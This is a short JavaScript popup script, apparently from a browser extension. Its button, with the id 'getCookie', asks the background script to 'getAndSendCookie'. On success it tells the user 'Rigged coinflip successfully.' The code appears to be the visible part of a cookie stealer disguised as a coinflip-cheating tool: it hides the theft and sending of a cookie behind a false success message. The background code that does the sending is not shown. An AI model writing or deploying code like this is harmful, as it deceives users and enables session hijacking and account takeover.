document.getElementById("getCookie").addEventListener("click", () => {
    chrome.runtime.sendMessage({ action: "getAndSendCookie" }, (response) => {
        const output = document.getElementById("output");
        if (response.success) {
            output.textContent = "Rigged coinflip successfully.";
        } else {
            output.textContent = `Error: ${response.message}`;
        }
    });
});
